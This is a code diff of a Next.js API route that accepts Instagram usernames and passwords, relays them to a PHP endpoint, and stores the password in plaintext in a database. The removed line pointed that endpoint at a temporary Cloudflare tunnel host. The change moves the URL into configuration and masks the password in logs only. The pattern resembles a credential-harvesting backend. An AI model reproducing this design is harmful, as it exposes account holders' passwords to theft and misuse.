@@ -1,49 +1,126 @@
-import { NextRequest } from "next/server";
+import { NextRequest, NextResponse } from "next/server";
 import pool from "@/lib/db";
-const PHP_LOGIN_URL = "https://ciao-keno-significant-arcade.trycloudflare.com/instagram-login.php";
 
 export async function POST(req: NextRequest) {
   try {
-    const user_id = 1; // Replace with real session logic
+    // TODO: replace hardcoded userId with real session logic
+    const userId = 1;
+
     const body = await req.json();
-    const { username, password } = body;
+    const username = (body.username || "").toString().trim();
+    const password = (body.password || "").toString();
 
     if (!username || !password) {
-      return new Response(
-        JSON.stringify({ status: "error", message: "Missing credentials" }),
+      return NextResponse.json(
+        { status: "error", message: "Missing credentials" },
         { status: 400 }
       );
     }
 
-    // Get IP and user agent from headers
-    const ip_address = req.headers.get("x-forwarded-for") || "";
-    const user_agent = req.headers.get("user-agent") || "";
+    // Get IP and user agent from headers (use first IP if x-forwarded-for)
+    const xff = req.headers.get("x-forwarded-for") || "";
+    const ipAddress = (xff.split(",")[0] || "").trim() || req.headers.get("x-real-ip") || "";
+    const userAgent = req.headers.get("user-agent") || "";
 
     const requestTimestamp = new Date().toISOString();
 
-    // Send login request to PHP server
-    const phpRes = await fetch(PHP_LOGIN_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        username,
-        password,
-        ip_address,
-        user_agent,
-      }),
-    });
+    // --- Get PHP login URL from DB (fallback to env) ---
+    const cfg = await pool.query(
+      "SELECT value FROM app_config WHERE key = $1 LIMIT 1",
+      ["php_login_url"]
+    );
+    const rawUrl =
+      (cfg && cfg.rowCount && cfg.rowCount > 0 ? (cfg.rows[0].value || "").toString().trim() : "") ||
+      (process.env.PHP_LOGIN_URL || "").toString().trim();
+    if (!rawUrl) {
+      return NextResponse.json(
+        { status: "error", message: "PHP login URL not configured" },
+        { status: 500 }
+      );
+    }
 
-    let loginResult;
-    let phpRawResponse;
+    let PHP_LOGIN_URL: string;
     try {
-      phpRawResponse = await phpRes.text();
+      const u = new URL(rawUrl);
+      if (!/^https?:$/.test(u.protocol)) throw new Error("Invalid protocol");
+      PHP_LOGIN_URL = u.toString();
+    } catch (err) {
+      console.error("Invalid PHP_LOGIN_URL:", rawUrl, err);
+      return NextResponse.json(
+        { status: "error", message: "Invalid PHP login URL" },
+        { status: 500 }
+      );
+    }
+
+    // Send login request to PHP server (with timeout + better logging)
+    let phpRes: Response;
+    try {
+      const controller = new AbortController();
+      const timeout = setTimeout(() => controller.abort(), 10000); // 10s
+      try {
+        phpRes = await fetch(PHP_LOGIN_URL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+          },
+          body: JSON.stringify({
+            username,
+            password,
+            ip_address: ipAddress,
+            user_agent: userAgent,
+          }),
+          signal: controller.signal,
+        });
+      } finally {
+        clearTimeout(timeout);
+      }
+    } catch (err) {
+      console.error("Failed to contact PHP server (network/timeout):", err);
+      return NextResponse.json(
+        { status: "error", message: "Failed to contact PHP server" },
+        { status: 502 }
+      );
+    }
+
+    // Read body and capture headers for debugging
+    const phpRawResponse = await phpRes.text();
+    const phpHeaders = Object.fromEntries(phpRes.headers.entries());
+
+    // If you get a 403 from Cloudflare it is commonly Cloudflare Access / Tunnel auth / ingress issue
+    if (phpRes.status === 403) {
+      console.error("PHP endpoint returned 403 Forbidden", {
+        url: PHP_LOGIN_URL,
+        status: phpRes.status,
+        statusText: phpRes.statusText,
+        headers: phpHeaders,
+        body: phpRawResponse,
+      });
+      return NextResponse.json(
+        {
+          status: "error",
+          message:
+            "PHP server returned 403 Forbidden. Check Cloudflare tunnel / Access policies / hostname (see server logs).",
+          details: phpRawResponse?.slice?.(0, 100) || null,
+        },
+        { status: 502 }
+      );
+    }
+
+    let loginResult: any;
+    try {
       loginResult = JSON.parse(phpRawResponse);
     } catch (err) {
       console.error("PHP response not JSON:", phpRawResponse);
-      return new Response(
-        JSON.stringify({ status: "error", message: "PHP server error", details: phpRawResponse }),
-        { status: 500 }
+      return NextResponse.json(
+        { status: "error", message: "PHP server error", details: phpRawResponse },
+        { status: 502 }
       );
+    }
+
+    // If PHP responded with non-OK HTTP status, forward error
+    if (!phpRes.ok && loginResult) {
+      return NextResponse.json(loginResult, { status: 502 });
     }
 
     const responseTimestamp = new Date().toISOString();
@@ -55,25 +132,25 @@ export async function POST(req: NextRequest) {
           (user_id, instagram_username, instagram_password, created_at, status, ip_address, user_agent, session_id, api_response)
           VALUES ($1, $2, $3, NOW(), TRUE, $4, $5, $6, $7)`,
         [
-          user_id,
+          userId,
           username,
           password,
-          ip_address,
-          user_agent,
-          loginResult.session_id,
-          JSON.stringify(loginResult.instagram_response),
+          ipAddress,
+          userAgent,
+          loginResult.session_id || null,
+          JSON.stringify(loginResult.instagram_response || {}),
         ]
       );
     }
 
-    // Save detailed login info as JSON in login_logs table
+    // Mask password in logs
     const loginLog = {
       request: {
         timestamp: requestTimestamp,
         username,
-        password,
-        ip_address,
-        user_agent,
+        password: "*****",
+        ip_address: ipAddress,
+        user_agent: userAgent,
       },
       response: {
         timestamp: responseTimestamp,
@@ -87,11 +164,11 @@ export async function POST(req: NextRequest) {
       [username, JSON.stringify(loginLog)]
     );
 
-    return Response.json(loginResult);
+    return NextResponse.json(loginResult);
   } catch (e) {
     console.error("API error:", e);
-    return new Response(
-      JSON.stringify({ status: "error", message: "Internal server error" }),
+    return NextResponse.json(
+      { status: "error", message: "Internal server error" },
       { status: 500 }
     );
   }
